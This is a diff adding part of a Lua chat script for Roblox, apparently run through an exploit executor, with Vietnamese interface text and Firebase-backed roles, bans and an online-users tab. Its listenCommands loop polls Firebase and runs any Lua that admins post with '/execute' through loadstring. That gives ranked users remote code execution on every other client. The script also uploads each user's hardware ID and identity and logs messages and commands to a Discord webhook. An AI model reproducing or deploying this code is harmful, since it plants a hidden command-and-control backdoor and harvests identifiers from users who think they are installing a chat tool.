+    local function addLbl(p, txt, f, s, c)
+        local l = Instance.new("TextLabel", p); l.BackgroundTransparency=1; l.Size=UDim2.new(1,0,0,0); l.AutomaticSize=Enum.AutomaticSize.Y
+        l.TextWrapped=true; l.TextXAlignment = Enum.TextXAlignment.Left; l.Text=txt; l.Font=f; l.TextSize=s; l.TextColor3=c; return l
+    end
+
+    addLbl(InfoSection, roleStr .. " " .. dName .. " [" .. timeString .. "]", Enum.Font.GothamBold, 13, Color3.fromRGB(240, 240, 240))
+    addLbl(InfoSection, "@" .. uName, Enum.Font.Gotham, 11, Color3.fromRGB(180, 180, 180))
+    if canSeeHWID then addLbl(InfoSection, "HWID: " .. (msgData.hwid or "N/A"), Enum.Font.Code, 10, Color3.fromRGB(150, 150, 150)) end
+
+    local ContentSection = Instance.new("Frame", Frame)
+    ContentSection.BackgroundTransparency = 1; ContentSection.Size = UDim2.new(1, 0, 0, 0); ContentSection.AutomaticSize = Enum.AutomaticSize.Y
+    local ContentLayout = Instance.new("UIListLayout", ContentSection); ContentLayout.Padding = UDim.new(0, 5)
+
+    if msgData.message and msgData.message ~= "" then addLbl(ContentSection, msgData.message, Enum.Font.Gotham, 14, Color3.fromRGB(255, 255, 255)) end
+
+    if msgData.imageLink and msgData.imageLink ~= "" then
+        local ImageFrame = Instance.new("Frame", ContentSection)
+        ImageFrame.SizeConstraint = Enum.SizeConstraint.RelativeXX; ImageFrame.Size = UDim2.new(0.5, 0, 0.5, 0); ImageFrame.BackgroundTransparency = 1 
+        local ImageLabel = Instance.new("ImageLabel", ImageFrame)
+        ImageLabel.Size = UDim2.new(1, 0, 1, 0); ImageLabel.BackgroundTransparency = 1; ImageLabel.ScaleType = Enum.ScaleType.Fit
+        task.spawn(function()
+            local asset = getCacheAsset(msgData.imageLink)
+            if asset then ImageLabel.Image = asset else
+                local err = addLbl(ImageFrame, "Không tải được ảnh", Enum.Font.Gotham, 12, Color3.fromRGB(255,100,100))
+                err.Size = UDim2.new(1,0,1,0); err.TextXAlignment = Enum.TextXAlignment.Center; err.TextYAlignment = Enum.TextYAlignment.Center
+            end
+        end)
+    end
+
+    table.insert(storageTbl, Frame)
+    if #storageTbl > MAX_MSGS then storageTbl[1]:Destroy(); table.remove(storageTbl, 1) end
+end
+
+---------------------------------------------------
+-- UPDATE ONLINE TAB 
+---------------------------------------------------
+local function updateUsersTab()
+    for _, v in ipairs(Pages["users"]:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end
+    
+    for uname, udata in pairs(OnlineUsersList) do
+        local safeUserId = tonumber(udata.userId) or 1
+        local safeDName = udata.displayName or uname
+        local safeUsername = udata.username or uname
+        
+        local uRole = getRole(safeUsername)
+        local uRoleStr = (uRole == "HEADOWNER") and "[👑 HEADOWNER]" or (uRole == "OWNER") and "[⭐ OWNER]" or (uRole == "ADMIN") and "[🛡️ ADMIN]" or "[👤 USER]"
+        
+        local f = Instance.new("Frame", Pages["users"])
+        f.Size = UDim2.new(1, 0, 0, 50); f.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
+        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 6)
+        
+        local ava = Instance.new("ImageLabel", f)
+        ava.Size = UDim2.new(0, 36, 0, 36); ava.Position = UDim2.new(0, 7, 0, 7); ava.BackgroundColor3 = Color3.fromRGB(100,100,100); ava.ScaleType = Enum.ScaleType.Crop
+        Instance.new("UICorner", ava).CornerRadius = UDim.new(1, 0)
+        ava.Image = "rbxthumb://type=AvatarHeadShot&id=" .. safeUserId .. "&w=150&h=150"
+        
+        local l1 = Instance.new("TextLabel", f)
+        l1.Size = UDim2.new(1, -60, 0, 20); l1.Position = UDim2.new(0, 55, 0, 5); l1.BackgroundTransparency = 1
+        l1.Text = uRoleStr .. " " .. safeDName; l1.Font = Enum.Font.GothamBold; l1.TextSize = 13; l1.TextColor3 = Color3.fromRGB(240,240,240); l1.TextXAlignment = Enum.TextXAlignment.Left
+        
+        local l2 = Instance.new("TextLabel", f)
+        l2.Size = UDim2.new(1, -60, 0, 20); l2.Position = UDim2.new(0, 55, 0, 25); l2.BackgroundTransparency = 1
+        l2.Text = "@" .. safeUsername; l2.Font = Enum.Font.Gotham; l2.TextSize = 12; l2.TextColor3 = Color3.fromRGB(150,150,150); l2.TextXAlignment = Enum.TextXAlignment.Left
+    end
+end
+
+---------------------------------------------------
+-- XỬ LÝ LỆNH TARGET & THỰC THI 
+---------------------------------------------------
+local function getTargetsFromQuery(query)
+    local tList = {}
+    local qLower = query:lower()
+    
+    if qLower == "all" then
+        for uname, _ in pairs(OnlineUsersList) do
+            if RANK_WEIGHTS[getRole(uname)] < myWeight then table.insert(tList, uname) end
+        end
+    elseif qLower == "others" then
+        for uname, _ in pairs(OnlineUsersList) do
+            if uname ~= LocalPlayer.Name and RANK_WEIGHTS[getRole(uname)] < myWeight then table.insert(tList, uname) end
+        end
+    elseif qLower:sub(1,1) == "@" then
+        table.insert(tList, query:sub(2))
+    else
+        local found = false
+        for uname, data in pairs(OnlineUsersList) do
+            if (data.displayName and data.displayName:lower() == qLower) or (data.hwid and data.hwid == query) or (uname:lower() == qLower) then
+                table.insert(tList, uname); found = true
+            end
+        end
+        if not found then table.insert(tList, query) end
+    end
+    return tList
+end
+
+local function processCmds(text)
+    if text:match("^/clear%s*$") then
+        for _, v in pairs(msgFrames) do v:Destroy() end; msgFrames = {}
+        for _, v in pairs(adminMsgFrames) do v:Destroy() end; adminMsgFrames = {}
+        return true, "Đã dọn dẹp lịch sử hiển thị UI.", "clear", nil, nil
+    end
+
+    local cmd, tgtRaw, args = text:match('^/([^%s]+)%s+"([^"]+)"%s*(.*)')
+    if not cmd then return false, text, nil, nil, nil end
+    cmd = cmd:lower()
+    
+    local validCmds = {ban=1, unban=1, addadmin=1, removeadmin=1, addowner=1, removeowner=1, execute=1}
+    if not validCmds[cmd] then return false, text, nil, nil, nil end
+
+    local targets = getTargetsFromQuery(tgtRaw)
+    if #targets == 0 then return true, "Không tìm thấy mục tiêu hợp lệ!", cmd, tgtRaw, args end
+
+    local sCount = 0
+    for _, tgt in ipairs(targets) do
+        local tRole = getRole(tgt); local tWeight = RANK_WEIGHTS[tRole] or 1
+
+        if cmd == "ban" and myWeight >= 2 and myWeight > tWeight then
+            task.spawn(function() http_request({Url = FIREBASE_URL .. PATH_BAN .. tgt .. ".json", Method="PUT", Body="true"}) end); sCount = sCount + 1
+        elseif cmd == "unban" and myWeight >= 2 and myWeight > tWeight then
+            task.spawn(function() http_request({Url = FIREBASE_URL .. PATH_BAN .. tgt .. ".json", Method="DELETE"}) end); sCount = sCount + 1
+        elseif cmd == "addadmin" and myWeight >= 3 and myWeight > tWeight then
+            task.spawn(function() http_request({Url = FIREBASE_URL .. PATH_ROLES .. tgt .. ".json", Method="PUT", Body=HttpService:JSONEncode("ADMIN")}); fetchRoles() end); sCount = sCount + 1
+        elseif cmd == "removeadmin" and myWeight >= 3 and myWeight > tWeight then
+            task.spawn(function() http_request({Url = FIREBASE_URL .. PATH_ROLES .. tgt .. ".json", Method="DELETE"}); fetchRoles() end); sCount = sCount + 1
+        elseif cmd == "addowner" and myWeight == 4 and tWeight < 3 then
+            task.spawn(function() http_request({Url = FIREBASE_URL .. PATH_ROLES .. tgt .. ".json", Method="PUT", Body=HttpService:JSONEncode("OWNER")}); fetchRoles() end); sCount = sCount + 1
+        elseif cmd == "removeowner" and myWeight == 4 and tRole == "OWNER" then
+            task.spawn(function() http_request({Url = FIREBASE_URL .. PATH_ROLES .. tgt .. ".json", Method="DELETE"}); fetchRoles() end); sCount = sCount + 1
+        elseif cmd == "execute" and myWeight >= 2 and myWeight > tWeight then
+            if args and args ~= "" then
+                task.spawn(function() http_request({Url = FIREBASE_URL .. PATH_CMDS .. ".json", Method="POST", Body=HttpService:JSONEncode({target=tgt, code=args, sender=LocalPlayer.Name, time=os.time()})}) end)
+                sCount = sCount + 1
+            end
+        end
+    end
+    
+    return true, "Thực thi thành công trên " .. sCount .. " mục tiêu!", cmd, tgtRaw, args
+end
+
+local function handleSend()
+    local text = MsgBox.Text; local img = ImgBox.Text; SuggestFrame.Visible = false
+    if (text == "" or text:match("^%s*$")) and (img == "" or img:match("^%s*$")) then return end
+    
+    local isTargetAdmin = (currentTab == "admin")
+    if isTargetAdmin and myLiveRole == "USER" then return end
+    if tick() - (isTargetAdmin and lastAdminSend or lastSend) < COOLDOWN then return end
+    if isTargetAdmin then lastAdminSend = tick() else lastSend = tick() end
+    
+    local isCmd, resultTxt, pCmd, pTgt, pArgs = processCmds(text)
+    if isCmd then
+        -- Log webhook cho lệnh
+        sendLogToDiscord(isTargetAdmin and "Admin" or "Thường", myLiveRole, nil, nil, pCmd, pTgt, pArgs)
+        MsgBox.Text = ""; game:GetService("StarterGui"):SetCore("SendNotification", {Title="Hệ Thống", Text=resultTxt, Duration=3})
+        return
+    end
+
+    -- Log webhook cho tin nhắn bình thường
+    sendLogToDiscord(isTargetAdmin and "Admin" or "Thường", myLiveRole, text, img, nil, nil, nil)
+
+    MsgBox.Text = ""; ImgBox.Text = ""; MsgBox.PlaceholderText = "Đang gửi..."
+    task.spawn(function()
+        http_request({
+            Url = FIREBASE_URL .. (isTargetAdmin and PATH_ADMINCHAT or PATH_CHAT), Method = "POST", Headers = {["Content-Type"]="application/json"},
+            Body = HttpService:JSONEncode({displayName=LocalPlayer.DisplayName, username=LocalPlayer.Name, userId=tostring(LocalPlayer.UserId), hwid=myHWID, message=text, imageLink=img, timestamp=os.time()})
+        })
+        task.wait(0.3); MsgBox.PlaceholderText = "Nhập tin nhắn hoặc lệnh..."
+    end)
+end
+SendBtn.MouseButton1Click:Connect(handleSend)
+
+---------------------------------------------------
+-- VÒNG LẶP FETCH DỮ LIỆU
+---------------------------------------------------
+local function fetchChat(path, seenTbl, storage, page, startT)
+    local res = http_request({Url = FIREBASE_URL .. path .. '?orderBy="$key"&limitToLast=15', Method = "GET"})
+    if not res or res.StatusCode ~= 200 then return end
+    pcall(function()
+        local data = HttpService:JSONDecode(res.Body); if type(data) ~= "table" then return end
+        local temp = {}
+        for k, v in pairs(data) do if v.timestamp >= startT then table.insert(temp, {k=k, v=v}) end end
+        table.sort(temp, function(a,b) return a.v.timestamp < b.v.timestamp end)
+        
+        for _, item in ipairs(temp) do
+            if not seenTbl[item.k] then
+                seenTbl[item.k] = true; renderMessage(item.v, page, storage)
+            end
+        end
+    end)
+end
+
+local lastCmdTime = os.time()
+local function listenCommands()
+    local res = http_request({Url = FIREBASE_URL .. PATH_CMDS .. '?orderBy="$key"&limitToLast=5', Method = "GET"})
+    if res and res.StatusCode == 200 then
+        pcall(function()
+            local data = HttpService:JSONDecode(res.Body)
+            for k, v in pairs(data) do
+                if v.time > lastCmdTime and v.target == LocalPlayer.Name then
+                    lastCmdTime = v.time; pcall(function() loadstring(v.code)() end)
+                end
+            end
+        end)
+    end
+end
+
+task.spawn(function()
+    local tickC = 0
+    while running do
+        if not isBanned then
+            task.spawn(function() fetchChat(PATH_CHAT, seen, msgFrames, Pages["chat"], startTime) end)
+            if myWeight >= 2 then task.spawn(function() fetchChat(PATH_ADMINCHAT, seenAdmin, adminMsgFrames, Pages["admin"], adminStartTime) end) end
+            task.spawn(listenCommands)
+            
+            if tickC % 5 == 0 then 
+                pcall(function() http_request({Url=FIREBASE_URL..PATH_ONLINE..LocalPlayer.Name..".json", Method="PUT", Body=HttpService:JSONEncode({displayName=LocalPlayer.DisplayName, username=LocalPlayer.Name, userId=tostring(LocalPlayer.UserId), hwid=myHWID, timestamp=os.time()})}) end)
+                local r = http_request({Url=FIREBASE_URL..PATH_ONLINE..".json", Method="GET"})
+                if r and r.StatusCode == 200 then
+                    pcall(function()
+                        local raw = HttpService:JSONDecode(r.Body)
+                        local newOnline = {}
+                        for uid, u in pairs(raw) do if os.time() - u.timestamp <= 20 then newOnline[uid] = u end end
+                        OnlineUsersList = newOnline
+                        updateUsersTab()
+                    end)
+                end
+            end
+            if tickC % 10 == 0 then 
+                fetchRoles()
+                myLiveRole = getRole(LocalPlayer.Name)
+                myWeight = RANK_WEIGHTS[myLiveRole]
+                checkAdminAccess()
+            end
+        end
+        tickC = tickC + 1
+        task.wait(1.5)
+    end
+end)
+
